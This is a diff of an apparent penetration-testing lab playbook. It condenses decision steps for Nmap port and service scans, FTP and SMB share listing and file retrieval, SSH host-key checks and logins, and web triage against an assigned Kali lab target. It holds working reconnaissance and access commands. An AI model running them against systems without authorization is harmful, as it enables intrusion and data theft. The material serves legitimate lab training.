@@ -54,10 +54,11 @@ Sources SHA-256: `ecec4118a4af2cf2dc8f29b82712febe898620d82e82079be85ef91df4a5a7
 
 # network
 
+Run from Kali. Replace `<IP_ADDRESS>` with the assigned box.
+
 ## NET-01. Check connectivity
 
-In Kali, ping the one assigned box. Use any small count that answers the same
-question; three is a convenient default:
+Enter when: you have a fresh assigned target.
 
 ```bash
 ping -c 3 '<IP_ADDRESS>'
@@ -65,3574 +66,1443 @@ ping -c 3 '<IP_ADDRESS>'
 
 | Result | Next |
 | --- | --- |
-| `reply`: one or more replies from the assigned IP | **NET-02**. Record any loss. |
-| `no_reply`: no replies after the command finishes | **NET-02**. ICMP silence does not rule out TCP services. |
-| `local_route_error`: local network-unreachable or wrong-destination error | **PAUSE-ROUTE**. Check the VPN and the assigned IP before scanning. |
-| `interrupted_or_ambiguous`: interrupted or contradictory output | Keep the uncertainty and answer the specific missing connectivity question. |
+| One or more replies from the assigned IP | **NET-02**. |
+| No replies | **NET-02**. ICMP silence does not rule out TCP services. |
+| Local unreachable-route error | **PAUSE-ROUTE**. Fix the VPN or assigned IP before scanning. |
 
 ## NET-02. Scan the box's TCP ports and services
 
-If a current complete scan for this same box is already available, use it.
-Otherwise run one full TCP scan from Kali. Run it in your box's lab directory.
-Nmap overwrites `results.txt` if it already exists, so preserve any earlier
-file before rerunning. The scan
-may take time. `-v` shows progress while it runs:
+Enter when: the box responds, or you have decided to scan anyway.
 
 ```bash
 sudo nmap -sC -sV -p- -v -T4 -oN results.txt '<IP_ADDRESS>'
 ```
 
-`sudo` gives Nmap its normal SYN scan, so do not add `-sT`. The command retains
-closed/filtered context instead of hiding it with `--open`. On a slow or lossy
-VPN, a later justified retry may need gentler timing; do not treat incomplete
-output as full coverage.
-
-If sudo is unavailable, run this **instead of** the default command. It uses a
-TCP connect scan with the same service check:
-
-```bash
-nmap -sT -sC -sV -p- -v -T4 -oN results.txt '<IP_ADDRESS>'
-```
-
-If Nmap stops at host discovery despite a correct assigned IP and working VPN,
-retry **once** with `-Pn`. A failed ping alone does
-not require this retry because Nmap uses more than ICMP for discovery:
-
-```bash
-sudo nmap -sC -sV -p- -v -T4 -Pn -oN results.txt '<IP_ADDRESS>'
-```
+If sudo is unavailable, use `nmap -sT -sC -sV -p- -v -T4 -oN results.txt '<IP_ADDRESS>'`. If discovery wrongly reports the host down, retry once with `-Pn`.
 
 | Result | Next |
 | --- | --- |
-| `open_ports`: completed scan with open ports and service details | **NET-05**. Pick one observed service; do not rescan it in NET-03 by default. |
-| `no_open_ports_complete`: completed full TCP scan, no open ports | **NET-04** only for a justified UDP question, otherwise **PAUSE-COVERAGE**. |
-| `host_discovery_down`: Nmap stopped before scanning ports | Check VPN/IP, then use the one `-Pn` retry above. This is not a filter bypass. |
-| `incomplete_or_failed`: interrupted scan, local error or uncertain finish | **PAUSE-COVERAGE**. Keep partial output and record what was not scanned. |
-
-Keep the results file as local evidence. No target file or listener is created.
-Do not overwrite a prior run just to repeat the command.
+| Completed scan with open ports and versions | **NET-05**. |
+| Completed scan, no open ports | **NET-04** for a justified UDP question, otherwise **PAUSE-COVERAGE**. |
+| Stopped at host discovery | Fix the route, then the one `-Pn` retry above. |
+| Interrupted or incomplete | **PAUSE-COVERAGE**. Keep the partial output. |
 
 ## NET-03. Clarify one ambiguous TCP service only if needed
 
-NET-02 already checked services. Skip this step and use **NET-05** when that
-result is useful. If one observed open port still has an important identity
-question, scan only that port in Kali:
+Enter when: one open port's service identity is genuinely unclear.
 
 ```bash
 nmap -sV -p '<OBSERVED_TCP_PORT>' '<IP_ADDRESS>'
 ```
 
-If Nmap stops **before scanning the port** at host discovery while the assigned
-IP and VPN route are still correct, retry that question once with `-Pn`:
-
-```bash
-nmap -sV -Pn -p '<OBSERVED_TCP_PORT>' '<IP_ADDRESS>'
-```
-
-Do not run both commands by default. A changed port state is a new observation,
-not proof that the earlier result was false. UDP is not a prerequisite to TCP
-service work.
+Add `-Pn` only if discovery gets in the way. Use the protocol's own reply when you can; a version guess is a lead, not a vulnerability.
 
 | Result | Next |
 | --- | --- |
-| `identified_or_candidate`: useful response or version candidate | **NET-05**. Match one observed protocol and endpoint; a fingerprint is not exploitability. |
-| `ambiguous_identity`: conflicting or uncertain response | **NET-05** for one supported native-protocol question, or **GAP-SERVICE/PAUSE-COVERAGE**. No unchanged probe loop. |
-| `no_response_or_changed_state`: endpoint now closed, filtered or silent after a completed scan | Keep both times/states. **NET-05** chooses another observed lead, or **PAUSE-COVERAGE** records the missing fact. |
-| Host-discovery-only stop with earlier current open evidence | Check the assigned IP/VPN, then use the one `-Pn` alternative above. Wrong route pauses instead. |
-| `incomplete_or_failed`: interrupted, local error or unknown completion | **PAUSE-COVERAGE**. Preserve partial output; do not infer a service identity from a missing response. |
-
-Keep the endpoint and response in private evidence. These probes create no target file.
+| Service identified or a candidate version returned | **NET-05**. |
+| Still ambiguous | One native-protocol probe, otherwise **GAP-SERVICE**. |
 
 ## NET-04. Check UDP when a specific question calls for it
 
-UDP is optional, not a gate before following TCP leads. When a UDP check is
-justified on the assigned box, run one top-1024 scan in Kali. Preserve any
-earlier `results.txt` before running it; this does not test every UDP port:
+Enter when: a TCP clue justifies UDP, e.g. a `smux` or `rpcbind` listener.
 
 ```bash
 sudo nmap -sU -p 1-1024 -v -oN results.txt '<IP_ADDRESS>'
 ```
 
-If Nmap stops at host discovery despite the correct assigned IP and VPN route,
-retry once with `-Pn` **instead of** repeating the
-first command unchanged:
-
-```bash
-sudo nmap -sU -p 1-1024 -v -Pn -oN results.txt '<IP_ADDRESS>'
-```
-
-A responding UDP service is a lead. `open|filtered` is inconclusive; do not
-mark it open. If UDP was not justified or sudo is unavailable, follow an
-existing TCP lead and record UDP as untested.
+This covers the top 1024 ports, not all UDP. `open|filtered` is unresolved, not open.
 
 | Result | Next |
 | --- | --- |
-| `response`: attributed response in the top-1024 set | **NET-05** for the matching permitted native protocol check. A port label alone is not identity. |
-| `open_filtered_or_silent`: `open\|filtered` or inconclusive silence | **NET-05** for one evidenced protocol question, or **PAUSE-COVERAGE** for a named gap. Do not mark silent ports open. |
-| `no_open_selected_ports`: completed top-1024 scan reports no open port | **NET-05** on other known leads. Other UDP ports remain untested. |
-| `deferred_or_failed`: no justified question, permission or required privilege | **NET-05** on an existing lead; record untested UDP and the condition for revisiting it. Failed contact does not mean the selected set was checked. |
-| Discovery-only stop with correct current route | Choose the one `-Pn` alternative above. |
-| Interrupted/error/unknown finish or unreadable output | **PAUSE-COVERAGE**. Keep partial output and the missing extent; never classify these as a UDP response. |
+| Attributed response | **NET-05** for the matching protocol check. |
+| `open\|filtered` or silence | **NET-05** for another lead, or **PAUSE-COVERAGE**. |
+| Interrupted or failed | **PAUSE-COVERAGE**. |
 
 ## NET-05 Choose a service to investigate
 
-Enter when: TCP and UDP findings or their explicit coverage gaps are available.
+Enter when: the scan produced at least one service.
 
-Question: Which discovered service should I investigate next?
+Question: Which service should I take next?
 
-Pick one discovered service. Review the matching checklist, then confirm it as your next investigation. Every other service stays queued.
+Pick one service with a real lead and open its task. An unidentified service returns to NET-03; a service with no task remains a coverage gap. A product-bearing service may open one service-only EXP-01 review.
 
-The selected service opens its matching checklist. A product-bearing non-web service may open one service-only EXP-01 candidate review. An unidentified service returns to NET-03; a service without a checklist stays visible as a coverage gap.
-
-- product_bearing_service_selected: The selected non-web endpoint has a persisted scanner-qualified product identity. Review one local candidate in a service-only EXP-01 context; this does not confirm vulnerability. Next: EXP-01.
-- http_reported: Nmap reported an HTTP/HTTPS label for this endpoint. WEB-01 must verify the response, including on an unusual port. Next: WEB-01.
-- domain_services_reported: Nmap reported a domain-service label. AD-01 must verify domain and controller context; SMB alone is not enough. Next: AD-01.
-- ftp_reported: Nmap reported FTP for this endpoint. FTP-01 must verify the protocol; the label does not establish access. Next: FTP-01.
-- smb_reported: Nmap reported SMB for this endpoint. SMB-01 must verify it; the label says nothing about share permissions. Next: SMB-01.
-- ssh_reported: Nmap reported SSH for this endpoint. SSH-01 must verify it; account availability and host trust remain separate. Next: SSH-01.
-- other_service: No authored protocol/context branch below matches the observed service. Preserve a specific unanswered question and gap. Next: GAP-SERVICE.
-- no_justified_lead: Recheck one named scan, route or identity gap, or save a resumable pause. Next: PAUSE-COVERAGE.
-- redis_reported: Nmap reported Redis for this endpoint. REDIS-01 must verify it with one read-only check; port 6379 alone is not service identity. Next: REDIS-01.
-- dns_reported: Nmap reported DNS for this endpoint. DNS-01 must verify it with one exact permitted lookup. Next: DNS-01.
-- rpc_nfs_reported: Nmap reported RPC/NFS for this endpoint. NFS-01 must verify it; a port alone does not prove export access. Next: NFS-01.
-- snmp_reported: Nmap reported SNMP. SNMP-01 must verify it with one community test; a response goes to SNMP-02. Next: SNMP-01.
-- database_reported: Nmap reported PostgreSQL or MariaDB/MySQL. DB-01 must verify the engine before using any permitted account. Next: DB-01.
-- mail_reported: Nmap reported a mail protocol. MAIL-01 must verify protocol, TLS and capabilities before any account or message read. Next: MAIL-01.
-- rdp_reported: Nmap reported RDP. RDP-01 must verify it; trust, permitted account and desktop prerequisites remain separate checks. Next: RDP-01.
+- http_reported: Nmap reported an HTTP/HTTPS label. WEB-01 must verify the response. Next: WEB-01.
+- domain_services_reported: A domain-service label was reported. AD-01 must verify domain and controller context. Next: AD-01.
+- ftp_reported: FTP was reported. FTP-01 verifies the protocol and access. Next: FTP-01.
+- smb_reported: SMB was reported. SMB-01 verifies shares and identity. Next: SMB-01.
+- ssh_reported: SSH was reported. SSH-01 checks host trust and account availability. Next: SSH-01.
+- redis_reported: Redis was reported. REDIS-01 proves the connection. Next: REDIS-01.
+- dns_reported: DNS was reported. DNS-01 asks the resolver. Next: DNS-01.
+- rpc_nfs_reported: RPC/NFS was reported. NFS-01 checks the export. Next: NFS-01.
+- snmp_reported: SNMP was reported. SNMP-01 tests one community. Next: SNMP-01.
+- database_reported: A database was reported. DB-01 confirms the engine and login. Next: DB-01.
+- mail_reported: A mail protocol was reported. MAIL-01 confirms protocol and TLS. Next: MAIL-01.
+- rdp_reported: RDP was reported. RDP-01 checks the permitted account. Next: RDP-01.
+- product_bearing_service_selected: A non-web service carries a scanner-qualified product. One candidate review is justified. Next: EXP-01.
+- other_service: No task matches the service. Keep a specific gap. Next: GAP-SERVICE.
+- no_justified_lead: No service has a lead. Keep a resumable pause. Next: PAUSE-COVERAGE.
 
 # file_services
 
 ## FTP-01. List under the exact permitted identity
 
-Use this anonymous listing only when anonymous access is permitted:
+Enter when: an FTP service answered.
 
 ```bash
 curl -sS 'ftp://<TARGET_IP>:<FTP_PORT>/'
 ```
 
-For one supplied account on an observed **plain FTP** endpoint, run in Kali
-Bash. Replace the endpoint, port and username here; curl prompts for the
-password. Do not put the password in the URL or command line:
+For a supplied account on plain FTP, curl prompts for the password:
 
 ```bash
-curl --disable --globoff -sS --connect-timeout 5 --ftp-pasv --ftp-skip-pasv-ip --user '<supplied-username>' 'ftp://<authorized-host>:<observed-ftp-port>/'
+curl --disable --globoff -sS --connect-timeout 5 --ftp-pasv --ftp-skip-pasv-ip --user '<USERNAME>' 'ftp://<TARGET_IP>:<FTP_PORT>/'
 ```
 
-If the endpoint requires FTPS, use **FTP-04** for a verified listing. Do not
-return to this plaintext command after a TLS failure.
-The trailing slash requests a directory listing for this account's starting
-directory; it does not read every file.
+If the server requires TLS, use **FTP-04** instead.
 
-| Result | Next choice |
+| Result | Next |
 | --- | --- |
-| Listing completes under the recorded identity | Keep the exact endpoint/account and one relevant listed name; **FTP-02** for a selected file read. Listing alone is not file access. |
-| Login denied or supplied account unavailable | Record the identity and denial; **NET-05** for another observed lead. No guessed users or password retries. |
-| Login succeeds but listing/data channel is denied or times out | Keep authentication separate from listing. Check the current route at **NET-01** or choose another lead at **NET-05**; do not mark listing complete. |
-| Unexpected server/protocol or changed TLS requirement | **NET-03** or **FTP-04** for the exact new condition before another request. |
-
-No local file or target artifact is created. Retain only relevant listing output
-in protected adventure data; the credential prompt must not enter it.
+| Listing returned | **FTP-02**. A listing is not file access. |
+| Login denied | **NET-05**. |
+| Login works, listing or data channel fails | Check the route at **NET-01**, then **NET-05**. |
+| TLS required | **FTP-04**. |
 
 ## FTP-02 Check one relevant FTP file
 
-Enter when: FTP-01 produced a listing for the current authorized identity.
-
-Question: Can this identity read a file whose name or context answers a current question?
-
-Choose one relevant listed file, read it through the same authorized session, and note how its content connects to an observed endpoint or identity.
-
-A successful read is distinct from a listing. A denied read applies only to this identity and path. Record a concrete clue before changing service lanes.
-
-- relevant_file_read: A specific file was read; choose the service or identity question justified by its contents. Next: NET-05.
-- listed_but_unreadable: Read was denied; retain the path and identity, then choose another lead. Next: NET-05.
-- no_relevant_file: No listed file currently answers a question; keep FTP reviewed, not proven empty. Next: NET-05.
-- session_changed_or_failed: Access context changed or failed before the read; re-establish the exact identity. Next: FTP-01.
-- tls_transport_required: Retain the FTPS mode and assigned certificate context from the observed listing. Review verified transport before the selected file read; TLS failure does not authorize plaintext. Next: FTP-04.
-- permitted_ssh_account_from_read: A completed, attributed read identifies an exact account and already observed SSH endpoint on the assigned host, and this one authentication check is permitted. Verify SSH host trust first; the file does not prove the account works. Next: SSH-01.
-
-Run in Kali Bash from a protected local adventure directory. Select one exact
-server-relative file path from FTP-01 or FTP-04. Replace the host, path and
-local copy name in the command. Percent-encode spaces and other reserved characters in
-the URL path; do not add a leading slash unless an absolute server path was
-observed. Use a fresh local copy name that does not exist. The plain-FTP
-examples expose credentials and content on the transport; use them only for
-the authorized lab path. Check that `curl --version` is 8.4.0 or newer before
-relying on the transfer-time size limit.
-
-For an observed plain-FTP anonymous context, read one file:
+Enter when: FTP-01 returned a listing as your identity.
 
 ```bash
-curl --disable --globoff --path-as-is -sS --fail --connect-timeout 5 --max-filesize 1048576 --ftp-pasv --ftp-skip-pasv-ip --user 'anonymous:' --output './<new-local-copy>.bin' 'ftp://<authorized-host>:<observed-ftp-port>/<exact-listed-relative-file-path>'
+curl --disable --globoff --path-as-is -sS --fail --connect-timeout 5 --max-filesize 1048576 --ftp-pasv --ftp-skip-pasv-ip --user 'anonymous:' --output './<LOCAL_COPY>.bin' 'ftp://<TARGET_IP>:<FTP_PORT>/<LISTED_PATH>'
 ```
 
-For an observed plain-FTP supplied identity, use this command. `curl` prompts
-for the password; never append it to the username:
+Use your supplied username in place of `anonymous:`. For FTPS, copy the matching verified command from FTP-04.
 
 ```bash
-curl --disable --globoff --path-as-is -sS --fail --connect-timeout 5 --max-filesize 1048576 --ftp-pasv --ftp-skip-pasv-ip --user '<supplied-username>' --output './<new-local-copy>.bin' 'ftp://<authorized-host>:<observed-ftp-port>/<exact-listed-relative-file-path>'
+sha256sum -- './<LOCAL_COPY>.bin'; file -- './<LOCAL_COPY>.bin'
+sed -n '1,80p' './<LOCAL_COPY>.bin' | cat -v
 ```
 
-For a completed **FTP-04** listing, instead choose the same verified mode,
-certificate hostname, CA, port and identity. These commands each read one named
-file and save it to a fresh local copy; neither falls back to plaintext.
-Implicit FTPS:
-
-```bash
-curl --disable --globoff --path-as-is -sS --fail --connect-timeout 5 --max-filesize 1048576 --ftp-pasv --ftp-skip-pasv-ip --cacert '<absolute-path-to-assigned-CA.pem>' --resolve '<assigned-cert-hostname>:<observed-ftp-port>:<authorized-ip>' --user '<supplied-username>' --output './<new-local-copy>.bin' 'ftps://<assigned-cert-hostname>:<observed-ftp-port>/<exact-listed-relative-file-path>'
-```
-
-Explicit FTP STARTTLS:
-
-```bash
-curl --disable --globoff --path-as-is -sS --fail --connect-timeout 5 --max-filesize 1048576 --ftp-pasv --ftp-skip-pasv-ip --ssl-reqd --cacert '<absolute-path-to-assigned-CA.pem>' --resolve '<assigned-cert-hostname>:<observed-ftp-port>:<authorized-ip>' --user '<supplied-username>' --output './<new-local-copy>.bin' 'ftp://<assigned-cert-hostname>:<observed-ftp-port>/<exact-listed-relative-file-path>'
-```
-
-For a permitted anonymous FTPS listing, replace only `<supplied-username>`
-with `anonymous:` in the matching command. Do not switch identity or mode
-between listing and read.
-
-| Result | Next choice |
+| Result | Next |
 | --- | --- |
-| Transfer completes with exit 0 | Hash and inspect the exact local copy. A zero-byte file can be a successful empty read. If it is a ZIP or private-key lead, **ART-01** for local triage. If it directly identifies one account for already observed SSH on this assigned host and that authentication is permitted, **SSH-01**; otherwise **NET-05**. |
-| Exit 67 or login denied | Identity was not established on this connection; **FTP-01** for plain FTP or **FTP-04** for the recorded FTPS context. No guessing or automatic retries. |
-| Exit 9, 78, access denied or file missing | Preserve the named path and server response. Do not conflate denial with absence; **NET-05**. |
-| Exit 7, 28 or data-channel failure | Recheck route at **NET-01** and endpoint at **NET-03**. Do not call this a file permission result. |
-| TLS certificate, hostname or CA failure | **FTP-04/PAUSE-ROUTE** for the recorded trust context. Do not retry over plain FTP. |
-| Exit 63 or incomplete transfer | Treat any local copy as partial, not a completed read. Choose a justified larger bounded read or another lead at **NET-05**. |
-| Different identity, path or server from the listing | Stop interpreting the comparison; **FTP-01** for plain FTP or **FTP-04** for FTPS. |
+| Transfer completed | Inspect the copy. ZIP or key material goes to **ART-01**; an account for observed SSH goes to **SSH-01**; otherwise **NET-05**. |
+| Login denied | **FTP-01**, or **FTP-04** for the FTPS context. |
+| Access denied or file missing | Keep the path and response; **NET-05**. |
+| Data-channel or TLS failure | **NET-01** / **FTP-04**. A partial file is not a read. |
 
-Only after a completed read, run these in Kali Bash:
-
-```bash
-sha256sum -- './<same-local-copy>.bin'
-file -- './<same-local-copy>.bin'
-```
-
-Only when `file` identifies text, display at most 80 lines:
-
-```bash
-sed -n '1,80p' './<same-local-copy>.bin' | cat -v
-```
-
-Retain a relevant copy under private adventure evidence with its original identity/path and
-hash. Otherwise remove the exact copy, including an incomplete transfer:
-
-```bash
-rm -i -- './<same-local-copy>.bin'
-```
-
-Finish that custody or cleanup choice before leaving FTP-02 for SSH-01 or NET-05.
+Delete the copy once it is triaged: `rm -i -- './<LOCAL_COPY>.bin'`.
 
 ## SMB-01 List shares for the current identity
 
-Enter when: The assigned endpoint answered as SMB, regardless of port number.
-
-Question: Which shares, if any, can the current permitted identity list?
-
-Try one anonymous share listing when permitted. If the exercise supplies an identity, check that identity separately and label its local or domain scope.
+Enter when: SMB answered.
 
 ```text
 smbclient -N -L '//<TARGET_IP>'
 ```
 
-A listed share is a name, not proof of directory read, file read, write or administrator access. Record which identity produced each list.
-
-- shares_listed: One or more shares were listed for the current identity. Next: SMB-02.
-- listing_denied: Anonymous or supplied access was denied; revisit only when a relevant permitted identity changes. Next: NET-05.
-- domain_identity_hint: The assigned host gives a domain/controller clue; verify it before using domain-specific routes. Next: AD-01.
-- transport_or_protocol_error: The failure precedes authentication or conflicts with the SMB fingerprint; check the endpoint. Next: NET-03.
-
-Use the retained no-password command only when that context is permitted.
-For a supplied account, run in Kali Bash. Pin the observed server name to the
-assigned IP. Use `DOMAIN\username` for a domain account or the observed
-server's local account context; `smbclient` prompts for the password:
+For a supplied account, use `-U '<DOMAIN_OR_SERVER>\<USERNAME>'` and let smbclient prompt:
 
 ```bash
-smbclient -L '<observed-server>' -I '<authorized-server-ip>' -p '<observed-smb-port>' -U '<supplied-domain-or-server>\<supplied-username>' --timeout 15
+smbclient -L '<TARGET_IP>' -p '<SMB_PORT>' -U '<DOMAIN_OR_SERVER>\<USERNAME>' --timeout 15
 ```
 
-| Result | Next choice |
+| Result | Next |
 | --- | --- |
-| Shares listed under this identity | Keep the server/IP/account and one relevant share name; **SMB-02** to check its contents. A share name is not a readable file. |
-| Login or share-list permission denied | Keep the exact stage and identity; **NET-05** for another lead. No automatic account retries. |
-| Domain/controller clue in the response | **AD-01** only if assigned or corroborated domain context applies. Do not infer a domain from SMB port 445. |
-| Transport/protocol or unexpected server identity | **NET-03/PAUSE-ROUTE** to resolve endpoint attribution before a share request. |
-
-This listing creates no local or target file. Stop before following a referral
-to another server until that destination is independently in scope.
+| Shares listed | **SMB-02**. A share name is not read access. |
+| Login or share-list denied | **NET-05**. |
+| Domain or controller clue | **AD-01**. |
+| Transport or identity error | **NET-03**. |
 
 ## SMB-02 Read a relevant SMB share path
 
-Enter when: SMB-01 listed a share for a known access context.
-
-Question: Can this identity enter the share and read a relevant path?
-
-Open one listed share with the same identity, list a relevant directory, and read only a file that answers a current question.
-
-```text
-smbclient -N '//<TARGET_IP>/<SHARE>' -c 'ls'
-```
-
-Keep share listing, directory entry and file read as separate observations. Permission denial applies to this identity and path; no read result establishes write access.
-
-- relevant_path_read: A path was read; choose a concrete cross-service or identity check justified by it. Next: NET-05.
-- share_entered_no_relevant_path: The share was entered but no current lead was found; keep other shares queued. Next: NET-05.
-- share_or_path_denied: The current identity was denied at a named share or path; revisit only after its access context changes. Next: NET-05.
-- identity_or_session_changed: Re-establish the identity that produced the earlier share list. Next: SMB-01.
-- permitted_ssh_account_from_read: A completed, attributed read identifies an exact account and already observed SSH endpoint on the assigned host, and this one authentication check is permitted. Verify SSH host trust first; the file does not prove the account works. Next: SSH-01.
-
-Run in Kali Bash from a protected local adventure directory. Use the exact
-server and share from SMB-01. A DFS referral may contact another server, so
-stop until that destination is separately in scope. For a domain account use
-`DOMAIN\username`; for a local account use the observed server/account
-context. Never put a password in the command.
-
-Open the share with a supplied identity. `smbclient` prompts for its password:
+Enter when: you have a listed share and a known identity.
 
 ```bash
-smbclient '//<observed-server>/<listed-share>' -I '<authorized-server-ip>' -p '<observed-smb-port>' -U '<supplied-domain-or-server>\<supplied-username>' --timeout 15
+smbclient '//<TARGET_IP>/<SHARE>' -I '<TARGET_IP>' -p '<SMB_PORT>' -U '<DOMAIN_OR_SERVER>\<USERNAME>' --timeout 15
 ```
 
-For the same permitted no-password context used in SMB-01, use this instead:
-
-```bash
-smbclient '//<observed-server>/<listed-share>' -I '<authorized-server-ip>' -p '<observed-smb-port>' --no-pass --timeout 15
-```
-
-At the `smb: \>` prompt, run one line at a time. Skip `cd` when the file is at
-the share root. Pick a fresh local copy name and use only the exact file found
-in the listing. Before `get`, check that its listed size is relevant, starting
-with at most 1 MiB. This is a selection check, not an enforced SMB byte limit.
+At the `smb: \>` prompt, list, then fetch one file and quit:
 
 ```text
-pwd
 ls
-cd "<observed-relative-directory>"
-ls "<exact-listed-filename>"
-get "<exact-listed-filename>" "./<new-local-copy>.bin"
+cd "<DIRECTORY>"
+get "<FILE>" "./<LOCAL_COPY>.bin"
 quit
 ```
 
-Abort an unexpectedly growing or stalled read with Ctrl+C. A partial local
-copy is not a completed read. Do not use `mget`, recursion, upload or remote
-delete in this decision.
-
-| Observation | Next choice |
+| Result | Next |
 | --- | --- |
-| Session or logon denied | **SMB-01**; preserve the exact local/domain identity. No guessed secrets. |
-| Share entered; `cd` or `get` denied | Record the boundary and exact path; **NET-05**. Share entry did not prove file read. |
-| Named file or directory missing | Recheck the exact listing/path/case once in this share; preserve the result at **NET-05** if unchanged. |
-| Named transfer completed without error | Hash and inspect the copy below. A ZIP or private-key lead goes to **ART-01** for local triage. An exact account for already observed SSH on this assigned host goes to **SSH-01** only when that authentication is permitted; other clues go to **NET-05**. |
-| Timeout, interruption or local write error | Partial/failed copy is not completed read. Preserve the stage; route transport to **NET-01** or fix local storage before a reviewed retry. |
-| Referral, different server or changed identity | Stop and verify scope/context before further access; **SMB-01**. |
-| Share entered but no relevant file | Keep other observed shares queued; **NET-05**. |
-
-After leaving `smbclient`, run these in Kali Bash only if the named transfer
-completed:
-
-```bash
-sha256sum -- './<same-local-copy>.bin'
-file -- './<same-local-copy>.bin'
-```
-
-Only when `file` identifies text, display at most 80 lines:
-
-```bash
-sed -n '1,80p' './<same-local-copy>.bin' | cat -v
-```
-
-Retain relevant content under private adventure evidence with identity/share/path/hash.
-Otherwise remove only the local copy, including failed partial files:
-
-```bash
-rm -i -- './<same-local-copy>.bin'
-```
-
-Finish that custody or cleanup choice before leaving SMB-02 for SSH-01 or NET-05.
+| File transferred | Inspect the copy as in FTP-02. ZIP or key material goes to **ART-01**; account-plus-SSH goes to **SSH-01**; otherwise **NET-05**. |
+| Share denied or logon denied | **SMB-01**. |
+| Path or file denied | Keep the path; **NET-05**. |
+| Timeout or partial copy | Not a completed read; retry or **PAUSE-COVERAGE**. |
 
 # remote_access
 
 ## SSH-01 Check the observed SSH access boundary
 
-Enter when: The assigned endpoint answered as SSH, regardless of port number.
-
-Question: Is this the intended SSH endpoint, and is one permitted account available for it?
-
-Read the offered host key and compare it with any previously pinned identity. Check whether the exercise supplied an account for this exact host; do not try guessed users or passwords.
+Enter when: SSH answered.
 
 ```text
 ssh-keyscan -T 5 -p <SSH_PORT> <TARGET_IP>
 ```
 
-The key scan is an unauthenticated observation, not proof of host identity. A changed pinned key stops login until explained. No supplied account leaves SSH blocked rather than tested empty.
+Compare the host key with anything already pinned. If one account is supplied, go straight to **SSH-02**; do not spray guessed users.
 
-- identity_ready: An SSH response is observed, no stored key conflicts, and one account is permitted for this host. Next: SSH-02.
-- no_permitted_identity: No supplied or already authorized account applies; keep SSH as an access prerequisite while choosing another observed lead. Next: NET-05.
-- host_key_conflict: A previously pinned key differs, or the endpoint's identity is otherwise in dispute; resolve the change before authentication. Next: PAUSE-ROUTE.
-- transport_or_protocol_error: The connection fails before host-key exchange or the endpoint does not answer as SSH; revisit service identification. Next: NET-03.
-
-Keep the original host-trust commands. If a permitted WREAD-01 or LNX-07 read
-reveals this assigned host's exact knock opening/closing events and SSH is not
-reachable, use SSH-03 before authentication. A closed port alone does not justify
-knocks. An already open port does not require another opening event. Carry any
-firewall cleanup owed by SSH-03 through SSH-02 and the source step's cleanup.
+| Result | Next |
+| --- | --- |
+| Endpoint answers, key unchanged, account supplied | **SSH-02**. |
+| Endpoint answers, no account | **NET-05**; SSH stays a blocked prerequisite. |
+| Pinned key changed | **PAUSE-ROUTE** until explained. |
+| Connection fails before key exchange | **NET-03**. |
 
 ## SSH-02. Verify one permitted SSH session and enter its host branch
 
-Enter after SSH-01 has checked this assigned SSH endpoint's host-key context and
-one account is permitted for this host. In Kali Bash, select **one** interactive
-connection command. Use the second only when the permitted account has a specific
-private key that the ordinary client configuration will not select. Keep passwords
-out of command arguments and let the client prompt for a permitted secret. Never
-disable host-key checking to pass a changed-key warning:
+Enter when: SSH-01 confirmed the endpoint and you have a permitted credential.
 
 ```bash
-ssh -p '<observed-SSH-port>' '<supplied-permitted-user>@<assigned-literal-IPv4>'
+ssh -p '<SSH_PORT>' '<USERNAME>@<TARGET_IP>'
 ```
 
-For a separately supplied and authorized private key instead:
+Use `-i '<KEY_PATH>' -o IdentitiesOnly=yes` instead when a key was supplied. Inside the session:
 
 ```bash
-ssh -i '<absolute-authorized-private-key-path>' -o IdentitiesOnly=yes -p '<observed-SSH-port>' '<supplied-permitted-user>@<assigned-literal-IPv4>'
-```
-
-Authentication, a welcome banner or an open channel is not yet a target shell.
-After login, run the matching block **inside the remote interactive session**, not
-in the Kali client shell. Linux/Unix shell:
-
-```bash
-hostname
-id
-uname -s
-```
-
-Windows PowerShell shell:
-
-```powershell
-hostname
-whoami
-```
-
-Windows cmd shell instead:
-
-```cmd
-hostname
-whoami
-ver
+hostname; id; uname -s
 ```
 
 | Result | Next |
 | --- | --- |
-| `linux_session_verified`: Linux host and effective identity corroborate the assigned SSH endpoint | **LNX-01** in this same shell. Reuse these observations there; check namespace/container context before any host-root claim. |
-| `windows_session_verified`: Windows host and identity corroborate the assigned SSH endpoint | **WIN-01** in this same shell. Verify the actual token, not the account label. |
-| `authentication_denied`: exact permitted identity is denied | Record this account/endpoint result, then **NET-05** for another observed lead. Retry only if a relevant credential or endpoint fact changes. |
-| `transport_or_trust_changed`: connection stops at transport or changed host key | **SSH-01** to recheck this endpoint and trust context. Do not accept a conflicting key or disable checking. |
-| `session_unverified`: authentication appears successful but no attributable usable shell | **EXP-03** for the exact missing host/channel fact. SFTP-only capability goes to **PAUSE-COVERAGE** as file access, not a shell. |
-
-Host mismatch, container/jump-host uncertainty, forced-command output or missing
-native command stays `session_unverified` until independent attribution is
-resolved. Do not contact an inferred adjacent host. Keep the exact client
-host/port, permitted identity, time and remote output in protected adventure
-data. Do not claim the objective from an account name or a prompt.
-
-End this specific remote shell with `exit` when finished; verify the channel
-closed. If SSH-03 opened the firewall, close that rule using SSH-03's command.
-Authentication alone is not permission to expand to another
-host. No target artifact is created by these identity checks.
+| Linux host and identity confirmed | **LNX-01** in this shell. |
+| Windows host and identity confirmed | **WIN-01** in this shell. |
+| Login denied | Record it; **NET-05**. |
+| Logged in but host or identity unverified | **EXP-03**. |
 
 # http
 
+Work one origin at a time: scheme, hostname, port.
+
 ## WEB-01. Initial web triage
 
-Enter when an assigned endpoint answers HTTP. Open the exact observed URL in
-the browser. Inspect the visible function, links, forms, source and Network
-requests. Record the application base and any useful path, hostname or input.
+Enter when: an endpoint answers HTTP.
 
-If the response or rendering is blank or ambiguous, inspect that exact request
-in browser Network: method, URL, status, headers, body and failed script/API
-requests. A HEAD response has no body by design. For an unauthenticated,
-read-only GET only, compare the exact URL once from Kali:
+Open the exact URL, browse the visible functions, and read source and Network requests. For a blank or broken render, inspect the failed request. For a plain read-only GET you can repeat safely:
 
 ```bash
-curl -i '<EXACT_OBSERVED_URL>'
+curl -i '<EXACT_URL>'
 ```
-
-For a POST/API request use its actual captured method at **WEB-08**; for an
-authenticated request use **WEB-09**. Do not treat a blank page, a redirect or
-an error page as proof that an operation executed.
 
 | Result | Next |
 | --- | --- |
-| `public_inventory`: useful paths/functions on this base | **WEB-04** for one unlinked-path question, or **WEB-06/08** for one observed input. |
-| `new_hostname`: redirect or link names another host | **WEB-05** for scope and exact origin before requesting it. |
-| Blank rendering but response body exists | Inspect failed script/API requests; **WEB-08** for one exact request. |
